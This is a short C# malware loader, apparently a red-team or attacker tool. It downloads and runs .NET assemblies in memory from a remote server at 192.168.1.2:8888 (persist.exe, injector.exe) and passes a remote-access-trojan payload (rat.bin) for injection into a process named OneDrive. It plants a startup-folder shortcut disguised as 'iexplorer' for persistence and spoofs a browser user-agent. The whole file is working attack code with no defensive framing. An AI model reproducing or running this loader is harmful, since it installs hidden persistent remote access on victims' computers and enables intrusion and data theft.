
using System;
using System.IO;
using System.Reflection;
using System.Linq;
using System.Net;

public class ikiik
{
	public static void loadAssembly(string url, object[] arguments)
        {
		WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64 blalalala)");
		byte[] bin = wc.DownloadData(url);
            	Assembly a = Assembly.Load(bin);
            	try
            	{
                	a.EntryPoint.Invoke(null, new object[] { arguments });
            	}
            	catch
            	{
                	MethodInfo method = a.EntryPoint;
                	if (method != null)
                	{
                    		object o = a.CreateInstance(method.Name);
                    		method.Invoke(o, null);
                	}
            	}
        }

	public static void Main(string[] args)
        {
		string lnkpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\startup\";
		string lnkname = "iexplorer";
		string newsname = "Startup";
		string command = @"C:\Windows\System32\cmd.exe";
		string commandargs = @"c:\users\ikiik\desktop\test\ikiik.exe";
		string[] p_arguments = new string[4] {lnkname, newsname, command, commandargs};
		if (File.Exists(lnkpath + lnkname + ".lnk") == false)
            	{
			object[] argumentss = p_arguments.ToArray();
			loadAssembly("http://192.168.1.2:8888/persist.exe", argumentss);
		}
		string[] i_arguments = new string[] {"http://192.168.1.2:8888/rat.bin", "DtGvFck#", "OneDrive"};
		object[] arguments = i_arguments.ToArray();
		loadAssembly("http://192.168.1.2:8888/injector.exe", arguments);
		Environment.Exit(0);		
	}
}
